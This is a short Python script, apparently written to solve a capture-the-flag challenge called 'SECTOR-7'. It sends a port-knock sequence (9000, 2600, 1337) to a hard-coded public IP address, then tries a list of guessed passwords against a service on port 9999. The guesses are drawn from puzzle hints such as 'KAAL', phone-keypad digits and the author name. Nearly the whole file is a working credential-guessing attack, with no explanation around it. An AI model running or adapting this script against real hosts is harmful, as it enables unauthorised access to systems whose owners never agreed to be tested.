#!/usr/bin/env python3
"""
Quick test of most obvious passwords
"""

import socket
import time

TARGET_IP = "13.206.58.35"
KNOCK_SEQUENCE = [9000, 2600, 1337]
SERVICE_PORT = 9999

def knock_ports():
    for port in KNOCK_SEQUENCE:
        try:
            s = socket.socket()
            s.settimeout(0.3)
            s.connect((TARGET_IP, port))
            s.close()
        except:
            pass
        time.sleep(0.2)

def try_pwd(pwd):
    try:
        knock_ports()
        time.sleep(0.3)
        
        s = socket.socket()
        s.settimeout(3)
        s.connect((TARGET_IP, SERVICE_PORT))
        
        s.recv(4096)  # banner
        s.send((pwd + "\n").encode())
        time.sleep(0.3)
        
        resp = s.recv(4096).decode('utf-8', errors='ignore')
        s.close()
        
        if "denied" not in resp.lower() and "incorrect" not in resp.lower():
            print(f"\n[+] '{pwd}': {resp}")
            return True
        return False
    except:
        return False

# Most obvious passwords based on hint
passwords = [
    # The hint says "His number" - maybe it's literally about KAAL
    "KAAL",
    "kaal",
    
    # IMEI is 15 digits - maybe use the knock sequence to make 15 digits
    "900026001337000",
    "000900026001337",
    
    # Phone keypad: KAAL = 5225
    "5225",
    
    # Emergency numbers
    "911",
    "112",
    
    # Simple combinations
    "9000",
    "2600",
    "1337",
    
    # Author
    "Glitch3r",
    
    # Maybe it's asking for the IMEI code itself
    "*#06#",
    "#06#",
    
    # Or just the digits from the code
    "06",
    "060",
    "0606",
    
    # SECTOR-7
    "SECTOR-7",
    "sector7",
    
    # Combination
    "KAAL-9000-2600-1337",
    "kaal-9000-2600-1337",
]

print("[*] Quick SECTOR-7 Password Test\n")

for pwd in passwords:
    print(f"[*] {pwd}", end="... ")
    if try_pwd(pwd):
        print(f"\n\n[!!!] FOUND IT: {pwd}")
        break
    else:
        print("✗")
    time.sleep(0.3)
